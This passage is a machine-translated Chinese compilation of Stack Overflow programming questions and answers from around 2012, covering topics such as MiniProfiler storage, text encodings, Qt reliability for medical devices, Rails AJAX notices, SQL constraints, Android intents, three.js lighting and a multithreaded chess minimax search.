是否有任何工具，例如用于 ASP.net MVC3 的 MiniProfiler 或类似的工具，但具有聚合结果等更多功能。

目前 MiniProfiler 非常适合理解和测量单个页面请求的性能。但它没有存储/记录任何用于报告的内容。我正在寻找可以持续监控和记录相同内容并让我们能够过滤在某个时间点内应用程序中最慢的查询是什么的东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-15T21:24:13.070

您可以使用 MiniProfiler 将结果存储在默认 HttpCache 以外的其他地方。在 Global.asax.cs 中设置期间，只需将其设置`MiniProfiler.Settings.Storage`为默认值（即 ）以外的值。`HttpRuntimeCacheStorage`您可以使用[StackExchange.Profiling.Storage](https://github.com/MiniProfiler/dotnet/tree/master/StackExchange.Profiling/Storage)中包含的提供程序之一（最可能的候选者是[SqlServerStorage](https://github.com/MiniProfiler/dotnet/blob/master/StackExchange.Profiling/Storage/SqlServerStorage.cs)），或者提出您自己的[IStorage](https://github.com/MiniProfiler/dotnet/blob/master/StackExchange.Profiling/Storage/IStorage.cs)实现以用于您想要的任何存储介质。然后，您应该能够根据您的要求根据需要报告分析数据。

# encoding - notepad ++ 显示 ucs-2LE 而 ubuntu FILE [file] 显示 UTF-16LE，我很困惑？

> ID：11736096
> 
> 赞同：5
> 
> 时间：2012-07-31T08:32:24.020
> 
> 标签：encoding, utf-8, notepad++, ucs2, utf-16le

我正在尝试将从 a 生成的文件转换`mssql`为 utf-8。`mssql`当我在 Windows Server 2003 中使用 notepad++打开他的输出时，当我将文件`UCS-2LE`复制到 Ubuntu 机器时识别出该文件，使用`file [file]`它显示编码为`UTF-16LE`. 真的很迷茫，编码肯定是有区别的，因为名字不一样。但是为什么我会在同一个文件中看到这个。它是`.csv`从 mssql 查询生成的文件。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T08:37:53.193

在大多数情况下，UTF-16 和 UCS-2 是一回事。没有区别。

这意味着每个字符都是两个字节宽。“LE”代表*little endian*，即每个两字节字符以低字节在前存储。

如果要转换为 UTF-8，请在 Notepad++ 中单击`Convert to UTF-8`“编码”菜单，然后保存。

如果您的其他程序在执行此操作后阻塞文件，或者您在文件开头看到两个垃圾字符，请`Convert to UTF-8 without BOM`改为单击。

# c++ - 基于 Qt 的 UI 是否足够可靠，可以在医疗设备中使用？

> ID：11736100
> 
> 赞同：11
> 
> 时间：2012-07-31T08:32:45.847
> 
> 标签：c++, windows, qt, user-interface, reliability

我在一家开发具有丰富 UI 的复杂医疗设备的小公司工作。我们目前处于设计的早期阶段。该应用程序面向 Windows（仅限桌面），最好只用 C++ 编写。

经过一些研究，我们倾向于选择 Qt 来开发 UI。它似乎满足了我们所有的需求，即可以开发出具有现代感和高响应性的 UI，开发速度相当快（熟悉之后），内存使用在某种程度上是合理的，免费用于商业用途（对我们来说是奖励）。

我的问题是：它对于医疗设备是否足够可靠？我们绝对不能接受考试中途发生的任何事故。我知道这首先当然取决于我们编写的代码的质量，但我仍然想知道是否有人遇到过任何与崩溃相关的神秘问题，这些问题特别难以解决。尤其是在使用 QML 这种脚本语言时，它自然会导致难以预测和解释的错误。

在生产中遇到此类问题的成本对我们来说将非常高，因此在我们选择任何特定的包之前，我们非常需要做出正确的决定。如果您知道在我们的特定上下文中可能出现的任何其他与 Qt 相关的问题（我承认不可能进行非常广泛的包测试），我也非常感谢您提及它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T11:50:10.220

在我看来，如果你遵循他们的编码风格，Qt 就足够稳定了。我还会从 Digia 购买支持并使用该库的稳定版本。

事情归结为：

*   评估使用 Qt（或任何其他 GUI 库）引入的风险
*   针对这些风险采取防御措施（引入新的需求和涵盖风险的测试，例如将 GUI 作为一个单独的进程运行，通过 TCP 或其他方式与核心通信）
*   评估应用程序崩溃的风险，并记录发生这种情况时要遵循的程序。

根据我对医疗设备认证的经验，设备的响亮碰撞比无声和错误的操作更可取。如有疑问，请询问跟进您案件的认证机构。

另外，请查看标准（例如 60601-1-4 或现在使用的任何标准）。

Qt 在医疗应用中的使用：http: [//qt.nokia.com/qt-in-use/qt-in-medical/](http://qt.nokia.com/qt-in-use/qt-in-medical/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T11:37:26.753

我认为高可靠性工程的基本原则就足够了。有了这些，您就可以使用 Qt。现在，Ambroz Bizjak 提到了很多“麻烦”的场景。当您遵循基本规则时，它们是无关紧要的。

那么，这些规则是什么？他们不是很难。识别可能发生故障的位，并在故障不严重的时候执行这些操作。例如，Ambroz 有一个关于窗口删除的好观点。不要在考试中间这样做。将对象转储到延迟删除队列中，并确保它们不会干扰操作（即对象必须具有被动状态。例如，对于小部件，包括不可见）。同样，在开始检查之前创建您可能需要的所有对象（包括所有可能的对话窗口）。

您可以很好地将其总结为

1.  可能失败的准备
2.  可能不会失败的事情
3.  可能失败的清理

由于已经提到的原因，我会避免使用 QML。上面的方案强调了为什么它如此成问题。您不能将所有可疑的 QML 步骤移至准备阶段。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-31T09:31:43.200

我假设您不是在开发对安全至关重要的设备，因为您正在运行 Windows 并且 Windows 许可协议对此有一些话要说。所以你的问题真的是，*“我们正在制造一种必须尽可能稳定的消费品，否则我们看起来会非常非常糟糕”*。

就个人而言，我可以建议使用 C#，因为它在 Windows 下具有出色的工具，并且使用它进行开发更加容易和安全（垃圾收集器是您的朋友，如果不是性能的话，也是稳定性的朋友），并且对单元测试更方便。对任何性能关键部分使用 C++ 或 C++/CLR，但没有理由使用这种复杂且具有潜在危险的语言来构建您的 GUI。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T09:50:01.947

根据我对 Qt 的经验，当可靠性很重要时，这是一个糟糕的选择。例如，许多崩溃是由看似有效的代码引起的，但它在某些特定的上下文中做了一些 Qt 的某些部分没有预料到的事情。在这里，我列出了我在使用 Qt 时遇到的关于编写正确代码的一些问题：

*   删除 QObjects（阅读：任何东西）是一个非常痛苦的过程。如果你从这个对象发出的信号中删除它（读取：一半的时间），你的程序可能会崩溃，因为发出信号的代码不会在你信号处理程序返回后检查对象是否仍然存在，并且可能继续使用它。

*   如果您仔细观察，建议的解决方法是使用 QObject::deleteLater() ，这将使事件循环在某个时候删除对象*，当它是安全的时*。虽然这似乎可以接受，但请考虑在此期间对象*仍然存在并且可以发出信号*。这引入了您必须处理的不必要的中间状态，这*将*引入错误；可能很少发生并且在非常特定的情况下发生（阅读：不是在您测试它时）。无论如何，[这个页面](http://code.mythtv.org/doxygen/group__qobject__dangers.html)讨论了 QObject 删除的一些问题。

*   Qt 中的其他类也有类似的删除相关问题。例如，QGraphicsScene::removeItem() 如果您在其 mousePressEvent 处理程序中从其场景中删除项目（而不是删除它），则可能会导致崩溃。这似乎没有记录在任何地方。

*   Qt 类充满了与核心功能集混合的*便利功能*，因此很难弄清楚该类的实际工作方式以及如何正确使用它。例如，QProcess 除了唯一需要的 stateChanged() 信号之外，还有 error()、finished() 和 started() 等信号，它们的语义和正确处理并不完全清楚。

*   许多抽象接口设计得很糟糕，定义也很糟糕。例如，类 QIODevice 用于*读取和写入*以及*阻塞和异步 I/O*。一个类可以自由选择要实现它的哪个子集。这违反了抽象接口的整体理念，即实现接口的任何东西都以定义和一致的方式工作。

*   没有*真正好的和统一*的方式来处理事件。Qt中有两种*事件：* *QEvents*，通过重新实现虚函数来安装回调，以及*信号*。*为什么？*无论如何，这两种事件最终都只是调用函数（直接，在这里忘记排队信号）。这意味着各个模块只能通过调用彼此的函数进行通信。正如已经看到的，这是有问题的，因为当一个模块调用另一个模块时，另一个模块真的可以做*任何事情*，并且可能很难考虑每个回调站点的所有可能场景（正如我们所见，Qt 没有，而是崩溃）。

    这个问题可以通过在事件循环中添加一个特性来完全解决，这使得跨模块的通信和同步变得更加容易。[我在这个问题](https://stackoverflow.com/questions/10064229/c-force-stack-unwinding-inside-function/10065950#10065950)中描述了这个设计。

总而言之，在追求最大可靠性时，您*不希望*在程序所基于的框架中出现此类设计问题，*也不希望*在几乎每一步都解决问题。即使你正确地解决了所有你能想到的问题，你*怎么知道没有更多的*问题？我认为您应该尝试在 Qt 中编写一些完全正确的代码（也就是说，阅读所有文档，并*考虑每一步*您在做什么以及框架将如何反应）。一段时间后，问问自己：你*相信*这个框架，还是觉得它在试图欺骗你？

# jquery - 无法使用 AJAX CRUD 操作发出通知，以及如何在不重新加载的情况下显示通知？

> ID：11736108
> 
> 赞同：2
> 
> 时间：2012-07-31T08:33:12.767
> 
> 标签：jquery, ruby-on-rails, ajax

**已编辑**

****尝试了很多解决方案，但没有任何效果。****

**这是来自 create.js.erb 的代码：**

 **```
$('<%= j render @website %>').appendTo('#websites').hide().fadeIn();
$("#new_website")[0].reset();
$(".alert").html("<%= escape_javascript(flash[:notice]) %>"); $(".alert").show(300); 
```

这是我的控制器：

```
 def create
@website = current_user.websites.new params[:website]

respond_to do |format|
  if @website.save
   format.html { redirect_to  @website, notice: 'Website was successfully created.' }
  format.js {
    flash[:notice] = 'Website was successfully created.'
    render action: 'create'
  }

   else
    format.html { render action: "new" }
    format.js { render action: "new" }
   end
  end
end 
```

我的通知警报的 HTML：

```
 <div class="alert alert-notice"> 
```

你能建议为什么它不起作用吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:54:45.487

看来您只是在响应html请求时设置通知，而不是js请求，我认为您需要这样的东西：

```
def create
  @website1 = Website1.new(params[:website1])

  respond_to do |format|
    if @website1.save
      format.html { redirect_to @website1, notice: 'website1 was successfully created.' }
      format.js {
        flash[:notice] = 'website1 was successfully created.'
        render action: 'create'
      }
    else
      format.html { render action: "new" }
      format.js { render action: "new" }
    end
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T11:05:36.190

尝试删除线

> 渲染动作：“创建”**

# java - 排队来自同一个 HTTP 客户端的 servlet 请求？

> ID：11736110
> 
> 赞同：0
> 
> 时间：2012-07-31T08:33:16.603
> 
> 标签：java, servlets, servlet-filters

我有一个常规的 servlet，（符合Oracle/Sun 定义的[servlet API ）。](http://docs.oracle.com/javaee/5/api/javax/servlet/FilterChain.html)它有时会接收来自数百个用户的大量请求，在某些情况下，任何 HTTP 客户端都可以快速连续地启动多个请求。有时，当第二个请求被接收并开始处理时，servlet 还没有完成对来自 HTTP 客户端的第一个请求的处理。因此，我希望能够通过在它们来自同一个 HTTP 客户端时将它们排队并按顺序处理它们来管理请求的处理。仅当从同一个 HTTP 客户端收到请求时才会出现此问题。

我听说过[FilterChains](http://docs.oracle.com/javaee/5/api/javax/servlet/FilterChain.html)，但不确定这是否适合这种情况。对来自用户的多个请求进行排队的最合适的方法是什么？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-31T09:01:14.773

在一个 HTML 页面中创建两个框架。一个主框架和另一个辅助框架。做一些事情，以便每当我们发送一个请求响应时都应该重定向到辅助框架。 **我不确定**它是否适用于您的情况。但我在我的项目中解决了这类问题。其中 servlet 处理很重。我无法完成一个 servlet 进程。

# sql - 强制 2 列具有唯一值

> ID：11736115
> 
> 赞同：3
> 
> 时间：2012-07-31T08:33:28.530
> 
> 标签：sql, sql-server, tsql

我正在为相关产品制作一张表格，因此产品将具有多对多的关系。我想确保产品与他们自己没有关系。

我的表如下所示：

```
ProductID int
RelatedToProductID int
Active bit 
```

并具有如下值：

```
productID RelatedToProductID Active
1         2                  1
1         3                  1
2         1                  1
2         2                  1 
```

但我想排除像上一个这样的关系，即产品与自身有关系。

有谁知道如何在 ms sql 中实现这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:37:05.747

您可以使用`check`约束来防止自我关系：

```
alter table YourTable
    add constraint CHK_YourTable_NoSelfRelation
    check (productID <> RelatedToProductID) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:44:19.400

您可以在列上添加 UNIQUE 约束 (productID,RelatedToProductID)

```
alter table YourTable add UNIQUE(productID,RelatedToProductID) 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-31T08:39:34.953

来自[MSDN](http://msdn.microsoft.com/en-us/library/ms188783.aspx)：

> C. 创建唯一的非聚集索引
> 
> 下面的示例在表的列上创建一个唯一的非聚集索引。索引将对插入列中的数据强制唯一性。

询问：

```
CREATE UNIQUE INDEX AK_ProductId_RelatedToProductId
    ON table (ProductId, RelatedToProductId); 
```

另请参阅[唯一索引与唯一约束之间的区别](http://blog.sqlauthority.com/2007/04/26/sql-server-difference-between-unique-index-vs-unique-constraint/)

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-07-31T08:35:35.490

```
Select ... From Table Where productId <> RelatedToProductId 
```

# android - Android Intent putExra 数据在检索器端不起作用

> ID：11736119
> 
> 赞同：0
> 
> 时间：2012-07-31T08:33:59.363
> 
> 标签：android, android-intent, android-widget

我是 Android 新手，我在配置 Activity 的帮助下更新了 Widget 上的 TextView。它工作正常。需要更新相同的文本视图以刷新按钮单击。为此，我通过 Intent 传递小部件 ID，但在接收方无法接收小部件 ID，因此无法更新文本视图。

在 Widget_Provider 中设置 Intent

```
Intent refreshIntent = new Intent(context, refreshWidgetActivity.class);
refreshIntent.setAction(ACTION_WIDGET_REFRESH);
PendingIntent refreshPendingIntent = PendingIntent.getActivity(context, 0, 
refreshIntent, 0);
remoteViews.setOnClickPendingIntent(R.id.button3, refreshPendingIntent);
refreshIntent.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID,appWidgetIds[0]); 
```

在收到活动结束时，

```
Intent intent = getIntent();
Bundle extras = intent.getExtras();
if (extras != null) {
mAppWidgetId = extras.getInt(
AppWidgetManager.EXTRA_APPWIDGET_ID, 
AppWidgetManager.INVALID_APPWIDGET_ID);
}

if (mAppWidgetId == AppWidgetManager.INVALID_APPWIDGET_ID) {
finish();
} 
```

这里 0 在 extras 而不是 Widget ID 中找到，请帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:54:55.300

Have you tried calling `putExtra` before you create the `PendingIntent`?

Like this:

```
Intent refreshIntent = new Intent(context, refreshWidgetActivity.class);
refreshIntent.setAction(ACTION_WIDGET_REFRESH);
refreshIntent.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID,appWidgetIds[0]);
PendingIntent refreshPendingIntent = PendingIntent.getActivity(context, 0, 
refreshIntent, 0);
remoteViews.setOnClickPendingIntent(R.id.button3, refreshPendingIntent); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:55:56.357

I think you have to manage some flags.

If I correctly understood your problem, you're trying to update data in your Activity passing it extras.

You don't set any FLAG for your Intent. Also, I don't really know where is your Intent and how it is launched. However, for a same kind of problem in my own application, I use this solution :

**I set my Intent with two flags :**

```
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP); 
```

In this way, my Intent will launch a new task (FLAG_ACTIVITY_NEW_TASK), then it will clear it to its root state (FLAG_ACTIVITY_CLEAR_TOP) (see Sources to understand why).

**Then, my PendingIntent was set to cancel the current, to be sure there is only one instance launched (no need more I think)**

```
PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_CANCEL_CURRENT); 
```

In this way, the new Intent will launch a new task, clear all previous data and take the new ones. The PendingIntent is not uselessly duplicated.

It works for my case, and I think it should work for yours. If any enhancements can be added, please tell me.

Sources : [http://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_CLEAR_TOP](http://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_CLEAR_TOP)

# model - 如何在场景中添加适当的灯光？

> ID：11736121
> 
> 赞同：1
> 
> 时间：2012-07-31T08:34:02.947
> 
> 标签：model, three.js, light, collada

在我的项目中，我添加了几个模型和其他几何对象，我可以移动相机在场景中进行扫描，但是当我添加如下灯光时，模型并没有按原样显示。我应该如何添加适当的灯光以适应场景中的模型。

```
var ambientLight = new THREE.AmbientLight(0x222222);
scene.add(ambientLight);

// add directional light source
var directionalLight = new THREE.DirectionalLight(0xffffff,2);
directionalLight.position.set(1, 1, 1).normalize();
scene.add(directionalLight);

 var directionalLight1 = new THREE.DirectionalLight(0xffffff);
directionalLight1.position.set(-1, -1, -1).normalize();
scene.add(directionalLight1); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T19:41:53.270

那将是一些非常黑暗的环境光。我会推荐一个更高的值，接近 0x555555 或更高。此外，您正在将定向光添加到场景中，但您将定向光的位置设置为非常接近场景的原点。

您看到`directionalLight.position`的是一个`THREE.Vector3`对象，您正在调用向量对象的 .set() 方法，然后简单地对结果进行规范化。你的物体比一个单位大吗？它在原点吗？如果是这样，我打赌你的定向光在你的物体内。仅使用环境照明，3D 模型看起来并不正确。相反，我建议您执行以下操作：

```
 var originVector = new THREE.Vector3(0,0,0);
        var ambLight = new THREE.AmbientLight(0x555555);
        scene.add(ambLight);

        var dirLight = new THREE.DirectionalLight(0xFFFFFF);
        dirLight.position.x = -200;
        dirLight.position.y = 200;
        dirLight.position.z = 150;
        dirLight.lookAt(originVector);
        scene.add(dirLight); 
```

如果您需要阴影，请参考我之前回答过的关于[在 Three.JS 中启用阴影的问题](https://stackoverflow.com/questions/10742149/how-to-create-directional-light-shadow-in-three-js/10904641#10904641)。这是我不久前制作的一个演示，它应该向您展示上述照明代码的结果：[Lighting Cube Acceleration Demo](http://cmg0030.zxq.net/threejs/acclDemo)。

# svm - 您如何处理 SVM 中的数据不平衡？

> ID：11736125
> 
> 赞同：6
> 
> 时间：2012-07-31T08:34:15.510
> 
> 标签：svm

如果我在 lrge 训练集上训练 SVM，并且如果类变量是 True 或 False，那么与训练集中的 False 值的数量相比，True 值很少会影响训练模型/结果吗？他们应该平等吗？如果我的训练集 True 和 False 的分布不均等，我该如何处理以使我的训练尽可能高效地完成？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:10:04.853

数据不平衡很好，因为 SVM 应该能够为与不太可能的实例相关的错误分类错误分配更大的惩罚（例如，在您的情况下为“True”），而不是分配相等的错误权重，这会导致不受欢迎的分类器将一切分配给大多数人。但是，使用平衡的数据*可能会*获得更好的结果。这一切都取决于你的数据，真的。

您可以人为地扭曲数据以获得更平衡的数据。你为什么不检查这篇论文： http: [//pages.stern.nyu.edu/~fprovost/Papers/skew.PDF](http://pages.stern.nyu.edu/~fprovost/Papers/skew.PDF)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-02-21T22:00:39.787

我的经验是，标准的 SVM 分类器在不平衡数据上并不能很好地工作。我在 C-SVM 中遇到过这种情况，而对于 nu-SVM 来说情况更糟。也许您想看看[P-SVM](http://www.bioinf.jku.at/software/psvm/)，它提供了一种特别适合不平衡数据的模式。

# c# - 列表框中项目之间的分隔线

> ID：11736129
> 
> 赞同：0
> 
> 时间：2012-07-31T08:34:22.670
> 
> 标签：c#, asp.net, css, .net-4.0

我喜欢在 ListBox 控件中的项目之间放置分隔线。使用该分隔线，我想让 ListBox 看起来像一列多行的表。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:07:30.743

```
 <DataTemplate>
                <Border BorderThickness="0,10,0,10" BorderBrush="Black">
                        <Grid Width="auto" HorizontalAlignment="Stretch" >
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="auto" />
                                <ColumnDefinition Width="*" />
                                <ColumnDefinition Width="48" />
                            </Grid.ColumnDefinitions>
                            <TextBlock VerticalAlignment="Center" FontSize="36" FontWeight="Bold" Grid.Column="0" Foreground="Black" Text="{Binding Path=Title}" Name="title"/>
                            <TextBlock VerticalAlignment="Center" HorizontalAlignment="Right" Grid.Column="1" Foreground="Black" Text="{Binding Path=Location}" Name="location"/>
                            <Image VerticalAlignment="Center" Grid.Column="2" Width="48" Height="48" Source="ApplicationIcon.jpg"/>
                        </Grid>
           </Border>
                    </DataTemplate> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:49:38.663

一种基本方法是为列表框项定义 CSS 样式：

```
<style type='text/css'>
option { border-top: solid 1px gray; }
</style>

...

<asp:ListBox ...></asp:ListBox> 
```

这将在每个列表框元素的底部添加一个灰色边框。

注意：这将适用于该页面上的所有列表框。如果您仅对某些列表框需要该样式，则将 CSS 类应用于列表框并将 CSS 更改为仅应用于那些：

```
<style type='text/css'>
select.table option { border-top: solid 1px gray; }
</style>

...

<asp:ListBox CssClass="table" ...></asp:ListBox> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:38:55.083

设置属性`MultiColumn=true`，然后：

```
listBox1.Items.AddRange(new object[]
    {
        "Item 1, column 1",
        "Item 2, column 1",
        "Item 3, column 1",
        "Item 4, column 1",
        "Item 5, column 1",
        "Item 1, column 2",
        "Item 2, column 2",
        "Item 3, column 2"
   }); 
```

请参阅[MSDN](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.multicolumn.aspx)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:47:05.623

受到 NestorArturo 的启发，发现了边境管制。

将 ItemTemplate 内容包装在 Border 控件中并指定 BorderThickness 和 BorderBrush 非常容易。我是这样走的，因为它不需要在 ItemTemplate 中更改我的 Grid。

边境控制在这里描述：[http](http://www.silverlightshow.net/items/Using-the-Border-control-in-Silverlight-2-Beta-1-.aspx) ://www.silverlightshow.net/items/Using-the-Border-control-in-Silverlight-2-Beta-1-.aspx 。

# java - “Maven 清洁”不起作用

> ID：11736130
> 
> 赞同：0
> 
> 时间：2012-07-31T08:34:23.027
> 
> 标签：java, eclipse, maven, m2e

我正在使用 Eclipse 插件“m2e”来编译和生成我的项目的源代码。但是，当我对代码进行修改并尝试在重新编译之前使用“Maven clean”时，它会显示“构建成功”，但生成的源代码仍然退出。此外，在“Maven clean”之后，如果我执行“Maven build”，我会收到错误并且必须重新启动 Eclipse 才能构建项目。知道为什么如何修复“Maven clean”这样可以正常工作吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:39:58.807

看起来你有一些`generated source`。`Maven clean`只删除`target`文件夹。如果你需要它到`clean`其他文件夹/文件，你需要`maven clean plugin` 在你的 pom 中定义并适当地配置它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:51:48.287

您使用的是 Linux 还是 Mac OS X？请注意，另一个进程（例如外壳程序）可能会将包含生成源的目录作为其当前目录。然后从另一个进程中删除该目录将起作用，但同一进程仍会将这个“陈旧”目录视为其当前目录。一旦您将当前目录更改为父目录，这将立即更改。

编辑：在 Windows 上，将目录作为当前目录或访问其任何成员的进程将阻止任何其他进程删除该目录。因此，Eclipse 似乎以某种方式访问​​了目标目录。

# android - 无法访问我的应用创建的文件

> ID：11736137
> 
> 赞同：0
> 
> 时间：2012-07-31T08:35:01.033
> 
> 标签：android

我的程序中有以下代码块。它创建一个文件夹和一个简单的 csv 文件。使用ASTRO可以成功创建文件，我确定文件和文件夹已创建，但是当我将设备连接到我的桌面时，我找不到文件夹或文件，我该怎么做才能让它们在我的桌面？我使用的设备是 Galaxy Nexus。

```
File folder = new File(Environment.getExternalStorageDirectory()+"/Chico");
if(!folder.exists()){
    folder.mkdir();
}
final String record = folder.toString() + "/" + "record.csv";
new Thread(){
    public void run(){
            try{
                FileWriter fw = new FileWriter(record);
                fw.append("ClientName");
                fw.append(',');
                fw.append("SiteName");
                fw.append(',');
                fw.append("Type");
                fw.append(',');
                fw.append("LogTime");
                fw.append(',');
                fw.append('\n');
                fw.close();
            } catch(Exception e) {

            }
    }
}.start(); 
```

![在桌面中查看](../Images/0d2f8cd5697407b9985f1beb32d41ef3.png) ![Galaxy Nexus 截图](../Images/7f36157e54b2f81a626e72d69a6b207d.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:44:57.277

您应该将附加模式指定为 true，否则您将无法附加到文件！

[FileWriter(String fileName, boolean append)](http://docs.oracle.com/javase/7/docs/api/java/io/FileWriter.html#FileWriter%28java.io.File,%20boolean%29)，所以在你的情况下，

```
FileWriter fw = new FileWriter(record,true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:42:42.690

`USB-storage`当您将设备连接到计算机时，如果 SD 卡处于模式下，应用程序可能无法使用它。

检查您是否在计算机中看到 SD 卡内容，如果看到，您将无法从应用程序访问它。

您应该能够通过名为“USB connected”的通知来控制 SD 卡模式，这将允许您打开`USB storage`/关闭。

你的应用应该为这个事件做准备，并在访问之前检查 SD 卡是否正确安装：

```
if (!Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
   ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:53:00.733

我猜你在eclipse中使用文件资源管理器来查找文件，文件资源管理器中sdcard文件夹的路径是“/mnt/sdcard”。

# c# - 最小-最大算法

> ID：11736143
> 
> 赞同：1
> 
> 时间：2012-07-31T08:35:27.507
> 
> 标签：c#, multithreading, chess, minmax

我已经为一个运行良好的国际象棋游戏编写了一个单线程的最小-最大算法。现在我正在尝试重写它以使用所有可用的 cpu 内核，但我无法让它正常工作。

我的想法是生成与系统上的内核一样多的线程（在我的情况下为 4），并让线程从队列中添加和删除工作项。这些工作项中的每一个都是一个“CalculateState”，它在棋盘上移动 x 次后保存有关可能棋盘的信息。

当工作项在 maxDepth 处生成时，它将评估棋盘并“返回”其值。返回是通过在检查移动树中向上传播其值来完成的（以模拟递归）。

算法开始：

```
private readonly ConcurrentPriorityQueue<int, CalculateState> _calculateStates = new ConcurrentPriorityQueue<int, CalculateState>(); 
private Thread[] _threads = new Thread[Environment.ProcessorCount];
private const int MaxDepth = 3;
private PlayerColor _maxPlayer;

public Move CalculateMoveMultithreaded(ChessBoard board)
    {
        _maxPlayer = board.TurnToMove;
        var parentState = new CalculateState(null, null, 0, null, int.MaxValue, int.MinValue, board.TurnToMove);

        foreach (var move in board.GetPossibleMoves())
        {
            move.MakeMove(board);
            var newState = ChessStateTransforms.TransformChessBoardToState(board);
            move.UnMakeMove(board);

            _calculateStates.Enqueue(MaxDepth, new CalculateState(move, newState, 1, parentState, int.MaxValue, int.MinValue, Player.OppositeColor(board.TurnToMove)));
        }

        for (var i = 0; i < _threads.Length; i++)
        {
            var calculationThread = new Thread(DoWork);
            _threads[i] = calculationThread;
            calculationThread.Start();
        }

        foreach (var thread in _threads)
        {
            thread.Join();
        }

        return parentState.MoveToMake;
    } 
```

线程执行：

```
private void DoWork()
    {
        while (true)
        {
            KeyValuePair<int, CalculateState> queueItem;
            if (!_calculateStates.TryDequeue(out queueItem))
                break;

            var calculateState = queueItem.Value;
            var board = ChessStateTransforms.TransformChessStateIntoChessBoard(calculateState.ChessState);

            if (calculateState.Depth == MaxDepth)
            {
                var boardValue = board.ValueOfBoard(_maxPlayer);
                calculateState.PropergateValue(boardValue);
                continue;
            }

            foreach (var move in board.GetPossibleMoves())
            {
                move.MakeMove(board);
                var newState = ChessStateTransforms.TransformChessBoardToState(board);
                move.UnMakeMove(board);

                _calculateStates.Enqueue(MaxDepth - calculateState.Depth, new CalculateState(calculateState.MoveToMake, newState, calculateState.Depth + 1, calculateState, calculateState.MinValue, calculateState.MaxValue, Player.OppositeColor(board.TurnToMove)));
            }

        }
    } 
```

工作项上下文。

```
 private class CalculateState
    {
        public readonly PlayerColor Turn;
        public int MaxValue;
        public int MinValue;

        public readonly int Depth;
        public readonly ChessState ChessState;
        public Move MoveToMake;

        private readonly CalculateState _parentState;        

        public CalculateState(Move moveToMake, ChessState chessState, int depth, CalculateState parentState, int minValue, int maxValue, PlayerColor turn)
        {
            Depth = depth;
            _parentState = parentState;
            MoveToMake = moveToMake;
            ChessState = chessState;
            MaxValue = maxValue;
            Turn = turn;
            MinValue = minValue;
        }

        public void PropergateValue(int value, Move firstMove = null)
        {
            lock (this)
            {
                if (Turn == _maxPlayer)
                {
                    if (value > MaxValue)
                    {
                        MaxValue = value;

                        if (Depth == 0)
                        {
                            MoveToMake = firstMove;
                            return;
                        }

                        _parentState.PropergateValue(MaxValue, MoveToMake);
                    }
                }
                else
                {
                    if (value < MinValue)
                    {
                        MinValue = value;

                        if (Depth == 0)
                        {
                            MoveToMake = firstMove;
                            return;
                        }

                        _parentState.PropergateValue(MinValue, MoveToMake);
                    }

                }
            }
        }
} 
```

因为它的算法将返回带走敌人碎片但根本不保护自己的动作。我相信棋盘、移动、棋盘值等中的代码是正确的。问题必须在多线程/传播值代码中。我已经为此撕裂了一个多星期的头发，非常感谢任何帮助。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:55:10.233

Sorry for not giving the exact answer on what you've asked (actualy your problem isn't clear ebough and investigating that based on what you've given is very hard), but I recommend better implementing **alpha-beta pruning** in your min-max. It may help you much more than hundreds of CPU-cores. It you like to read about that, see [http://www.cs.utah.edu/~hal/courses/2009S_AI/Walkthrough/AlphaBeta/](http://www.cs.utah.edu/~hal/courses/2009S_AI/Walkthrough/AlphaBeta/) and [http://cs.ucla.edu/~rosen/161/notes/alphabeta.html](http://cs.ucla.edu/~rosen/161/notes/alphabeta.html)

PS: regarding your question it would be hard to implement recursion multithreaded (effectively using all threads and not splitting the move-tree only on top-level). I'm almost sure you've done a bug there. I'd recommend you using additional queue of states needed to calculate (expand). Every thread should get item from the queue and calculate it adding clild nodes to your tree. So your algorithm will not be DFS any more but will transform into BFS (breadth first search) which is much more effective in such move-calculation tasks.

# jsp - 如何使 fmt:formatDate 为 form:input 工作

> ID：11736150
> 
> 赞同：15
> 
> 时间：2012-07-31T08:36:05.477
> 
> 标签：jsp, spring-mvc, jstl, date-format

